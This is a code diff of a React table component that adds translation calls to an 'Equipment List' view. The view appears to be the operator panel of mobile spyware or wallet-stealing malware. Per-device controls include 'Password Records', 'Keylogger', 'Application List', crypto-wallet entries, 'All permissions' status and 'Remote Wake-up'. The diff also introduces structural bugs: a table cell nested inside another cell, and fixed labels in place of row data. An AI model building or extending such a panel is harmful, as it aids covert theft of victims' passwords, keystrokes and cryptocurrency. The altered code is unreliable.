@@ -16,6 +16,7 @@ import { styled } from "@mui/material/styles";
 import PaginationControls from "./PaginationControls.js";
 import EditIcon from '@mui/icons-material/Edit';
 import InfoIcon from '@mui/icons-material/Info';
+import { useTranslation } from 'react-i18next';
 
 const headerBgColor = "#f5f5f5";
 const rowBgColorEven = "#ffffff";
@@ -31,12 +32,12 @@ const StyledTableCell = styled(TableCell)(({ theme }) => ({
   fontSize: "13px",
 }));
 
-const StyledTableHeadCell = styled(StyledTableCell)({
+const StyledTableHeadCell = styled(StyledTableCell)(({
   backgroundColor: headerBgColor,
   fontWeight: "bold",
   borderBottom: `1px solid ${borderColor}`,
   borderRight: `1px solid ${borderColor}`,
-});
+}));
 
 const CustomActionButton = styled(Button)(({ theme, color }) => ({
   backgroundColor: color === 'primary' ? "#1976d2" : color === 'secondary' ? "#ff5722" : "#ffffff",
@@ -81,41 +82,7 @@ const IconBox = styled(Box)(({ theme }) => ({
 }));
 
 const DeviveListTable = ({ rows, page, rowsPerPage, setPage, totalItems, handleChangeRowsPerPage }) => {
-//   const rows = [
-//     {
-//       id: 1,
-//       disp: <IconBox><IconButton size="small"><EditIcon fontSize="small" /></IconButton></IconBox>,
-//       deviceId: "324312be2be17363",
-//       versionRegion: " 3.5.3/HK 122.90.18.237",
-//       creationTime: "2024-06-13 13:31:08",
-//       lastUpdate: "2024-09-14 20:09:01",
-//       digitalGesture: "Digital/Gesture/Mi...",
-//       tpBitpe: " tpBitpe-/-",
-//       imkuCoin: "imkuCoin-/-",
-//       bobaFox: "bobaFox-/-",
-//       plusFour: "-/-/-",
-//       passwordRec: "Password Records",
-//       keylogger: "Keylogger",
-//       applicationList: "Application List",
-//       tags: "Tags: 3",
-//       brand: "OPPO",
-//       model: "PEHM00",
-//       versionParameter: "Version/Parameter: 12/13",
-//       userId: "User ID",
-//       accountProxy: "Account/Proxy: / Unassigned",
-//       nickname: "Nickname:",
-//       login: "Login:",
-//       batteryPolicy: "Battery Policy:",
-//       set: "Set",
-//       smartAssistant: "Smart Assistant:",
-//       enabledRunning: "Enabled Runn...",
-//       settingsStartup: "Settings/Startup mo...",
-//       hasBeenSet: "has been set. Last ...",
-//       totalManual: "Total/Manual/Auto S...",
-//       timesAndShutdown: "86 times/37 times/4...\nLast shutdown:",
-//     },
-   
-//   ];
+  const { t } = useTranslation();
 
   return (
     <Paper
@@ -134,23 +101,23 @@ const DeviveListTable = ({ rows, page, rowsPerPage, setPage, totalItems, handleC
           paddingBottom: "8px",
         }}
       >
-        Equipment List
+        {t('Equipment List')}
       </Typography>
 
       <Box sx={{ border: `1px solid ${borderColor}`, borderRadius: '4px' }}>
-        <TableContainer >
+        <TableContainer>
           <Table stickyHeader sx={{ minWidth: 650, borderCollapse: "separate" }} size="small" aria-label="user table">
             <TableHead>
               <TableRow>
-                <StyledTableHeadCell>Seri.</StyledTableHeadCell>
-                <StyledTableHeadCell>Application Information</StyledTableHeadCell>
-                <StyledTableHeadCell>Password Informa...</StyledTableHeadCell>
-                <StyledTableHeadCell>Related</StyledTableHeadCell>
-                <StyledTableHeadCell>Device Information</StyledTableHeadCell>
-                <StyledTableHeadCell>User Information</StyledTableHeadCell>
-                <StyledTableHeadCell>Set Status</StyledTableHeadCell>
-                <StyledTableHeadCell>Self-start</StyledTableHeadCell>
-                <StyledTableHeadCell>Open times</StyledTableHeadCell>
+                <StyledTableHeadCell>{t('Serial')}</StyledTableHeadCell>
+                <StyledTableHeadCell>{t('Application Information')}</StyledTableHeadCell>
+                <StyledTableHeadCell>{t('Password Information')}</StyledTableHeadCell>
+                <StyledTableHeadCell>{t('Related')}</StyledTableHeadCell>
+                <StyledTableHeadCell>{t('Device Information')}</StyledTableHeadCell>
+                <StyledTableHeadCell>{t('User Information')}</StyledTableHeadCell>
+                <StyledTableHeadCell>{t('Set Status')}</StyledTableHeadCell>
+                <StyledTableHeadCell>{t('Self-start')}</StyledTableHeadCell>
+                <StyledTableHeadCell>{t('Open Times')}</StyledTableHeadCell>
                 <StyledTableHeadCell
                   sx={{
                     position: "sticky",
@@ -160,77 +127,87 @@ const DeviveListTable = ({ rows, page, rowsPerPage, setPage, totalItems, handleC
                     boxShadow: "-4px 0px 10px rgba(0, 0, 0, 0.1)",
                   }}
                 >
-                  operate
+                  {t('Operate')}
                 </StyledTableHeadCell>
               </TableRow>
             </TableHead>
             <TableBody>
               {rows.map((row, index) => (
                 <StyledTableRow key={row.id} index={index}>
-                  <StyledTableCell>{row.id}<br/>
-                  <IconBox><IconButton size="small"><EditIcon fontSize="small" /></IconButton></IconBox>
+                  <StyledTableCell>
+                    {row.id}<br/>
+                    <IconBox>
+                      <IconButton size="small">
+                        <EditIcon fontSize="small" />
+                      </IconButton>
+                    </IconBox>
                   </StyledTableCell>
                   <StyledTableCell>
-                    Device ID: {row.deviceId}<br/>
-                    Version/Region: {row.versionRegion}<br/>
-                    Creation Time: {row.creationTime}<br/>
-                    Last Update: {row.lastUpdate}
+                    {t('Device ID')}: {row.deviceId}<br/>
+                    {t('Version/Region')}: {row.versionRegion}<br/>
+                    {t('Creation Time')}: {row.creationTime}<br/>
+                    {t('Last Update')}: {row.lastUpdate}
                   </StyledTableCell>
                   <StyledTableCell>
-                    {row.digitalGesture}<br/>
-                    {row.tpBitpe}<br/>
-                    {row.imkuCoin}<br/>
-                    {row.bobaFox}
-                  </StyledTableCell>
+  {t('Digital Gesture')}:<br/>
+  {t('TP Bitpe')}:<br/>
+  {t('IMKU Coin')}:<br/>
+  {t('Boba Fox')}:
+</StyledTableCell>
+
                   <StyledTableCell>
                     {row.plusFour} <IconButton size="small"><InfoIcon fontSize="small" /></IconButton><br/>
-                    <GreyButtons variant="outlined" size="small">{row.passwordRec}</GreyButtons><br/>
-                    <GreyButtons variant="outlined" size="small">{row.keylogger}</GreyButtons><br/>
-                    <GreyButtons variant="outlined" size="small">{row.applicationList}</GreyButtons><br/>
+                    <GreyButtons variant="outlined" size="small">{t('Password Rec')}</GreyButtons><br/>
+  <GreyButtons variant="outlined" size="small">{t('Keylogger')}</GreyButtons><br/>
+  <GreyButtons variant="outlined" size="small">{t('Application List')}</GreyButtons><br/>
                   </StyledTableCell>
                   <StyledTableCell>
-                    Brand: {row.brand}<br/>
-                    Model: {row.model}<br/>
-                    {row.versionParameter}<br/>
-                    <Box sx={{ display: 'flex', alignItems: 'center' }}>
-                      <IconBox>
-                        <IconButton size="small">
-                          <EditIcon fontSize="small" />
-                        </IconButton>
-                      </IconBox>
-                      <Typography sx={{ marginLeft: '8px' }}>Label:</Typography>
-                    </Box>
+  {t('Brand')}: {row.brand}<br/>
+  {t('Model')}: {row.model}<br/>
+  {t('Version/Parameter')}:<br/>
+  <Box sx={{ display: 'flex', alignItems: 'center' }}>
+    <IconBox>
+      <IconButton size="small">
+        <EditIcon fontSize="small" />
+      </IconButton>
+    </IconBox>
+    <Typography sx={{ marginLeft: '8px' }}>{t('Label')}:</Typography>
+  </Box>
+</StyledTableCell>
+
+                  <StyledTableCell>
+                  <StyledTableCell>
+  {t('User ID')}<br/>
+  {t('Account/Proxy')}: / 
+  <Typography component="span" sx={{ color: 'red', fontWeight: 'bold' }}>
+    {t('Unassigned')}
+  </Typography><br/>
+  {t('Nickname')}: <br/>
+  {t('Login')}:
+</StyledTableCell>
+
                   </StyledTableCell>
                   <StyledTableCell>
-                    {row.userId}<br/>
-                    Account/Proxy: / 
-                    <Typography component="span" sx={{ color: 'red', fontWeight: 'bold' }}>
-                      Unassigned
-                    </Typography><br/>
-                    {row.nickname}<br/>
-                    {row.login}
+                    {t('Battery Policy')}:<br/>
+                    <Typography component="span" sx={{ color: 'green', fontWeight: 'bold' }}> {t(row.set)}</Typography>
+                    <GreyButtons variant="outlined" size="small">{t('All permissions')}</GreyButtons><br/>
+                    {t('Smart Assistant')}:<br/>
+                    <Typography component="span" sx={{ color: 'green', fontWeight: 'bold' }}>{t('All permissions')}</Typography>
                   </StyledTableCell>
                   <StyledTableCell>
-                    Battery Policy:<br/>
-                    <Typography component="span" sx={{ color: 'green', fontWeight: 'bold' }}>{row.set}</Typography>
-                    <GreyButtons variant="outlined" size="small">All permissions</GreyButtons><br/>
-                    Smart Assistant:<br/>
-                    <Typography component="span" sx={{ color: 'green', fontWeight: 'bold' }}>{row.enabledRunning}</Typography>
-                  </StyledTableCell>
-                  <StyledTableCell>
-                    Settings/Startup method:<br/>
+                    {t('Settings/Startup Method')}:<br/>
                     <Typography component="span" sx={{ color: 'green', fontWeight: 'bold' }}>
-                      No settings required.
+                      {t('No settings required.') }
                     </Typography>{" "}
-                    Manually open.<br/>
-                    Last startup:<br/>
+                    {t('Manually open.')}<br/>
+                    {t('Last Startup')}:<br/>
                     2024-09-14 17:56:19
                   </StyledTableCell>
                   <StyledTableCell>
-                    Total/Manual/Auto Start:<br/>
-                    1 times/1 times/0 times<br/>
-                    Last shutdown:<br/>
-                    2024-09-14 17:56:19
+                    {t('Total/Manual/Auto Start')}:<br/>
+                    1 {t('times')}/1 {t('times')}/0 {t('times')}<br/>
+                    {t('Last Shutdown')}:<br/>
+                    
                   </StyledTableCell>
                   <StyledTableCell
                     sx={{
@@ -242,10 +219,10 @@ const DeviveListTable = ({ rows, page, rowsPerPage, setPage, totalItems, handleC
                     }}
                   >
                     <Box sx={{ display: "flex", flexDirection: "column", gap: 0.5 , paddingRight: "95px" }}>
-                      <CustomActionButton size="small" color="primary">Remote Wake-up</CustomActionButton>
-                      <CustomActionButton size="small" color="secondary">View Rules</CustomActionButton>
-                      <GreyButtons size="small">Add new rules</GreyButtons>
-                      <GreyButtons size="small">Batch Import</GreyButtons>
+                      <CustomActionButton size="small" color="primary">{t('Remote Wake-up')}</CustomActionButton>
+                      <CustomActionButton size="small" color="secondary">{t('View Rules')}</CustomActionButton>
+                      <GreyButtons size="small">{t('Add New Rules')}</GreyButtons>
+                      <GreyButtons size="small">{t('Batch Import')}</GreyButtons>
                     </Box>
                   </StyledTableCell>
                 </StyledTableRow>
